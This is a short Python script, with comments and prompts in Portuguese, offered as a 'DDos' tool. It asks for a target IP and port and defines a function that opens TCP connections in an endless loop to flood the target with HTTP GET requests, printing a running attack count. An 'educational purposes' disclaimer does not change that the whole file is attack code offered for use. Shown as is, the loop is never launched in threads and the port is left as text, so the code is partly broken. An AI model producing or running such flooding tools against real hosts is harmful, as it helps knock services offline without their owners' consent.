#importação para poder utilizar o time.sleep e o os.system
import socket
import threading
import time
import os
#código e avisos
os.system("clear")
os.system("figlet choko DDos")
print('AVISO LEGAL: ESTA FERRAMENTA SERVE PARA PROPÓSITOS EDUCACIONAIS USE AO SEU RISCO!!!')
time.sleep(5)
os.system("clear")
print('Por chokoznet, meu github: https://github.com/ChokoNetZ')
time.sleep(2)
print("carregando ferramenta...")
os.system("clear")
#Colocação dos alvos
alvo = input('IP do alvo: ')
seuip = input('Seu IP: ')
port = input('Digite a porta do IP: ') 
#aqui é o set de ataques, para contar a quantidade... que será visível no output
attack_num = 0
print('Começando ataque...')
print('Caso o terminal pare o processo de DDos, tente executar o código novamente e alterar a port, ou verificar se o ip inserido é válido.')
time.sleep(1)
print('para mais dúvidas me chame no instagram: https://instagram.com/ChokoZNet')
time.sleep(3)
os.system('clear')
print('ataque iniciado...')
#onde a coisa funciona :)
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((alvo, port))
        s.sendto(("GET /" + alvo + " HTTP/1.1\r\n").encode('ascii'), (alvo, port))
        s.sendto(("Host: " + seuip + "\r\n\r\n").encode('ascii'), (alvo, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()
#final do código
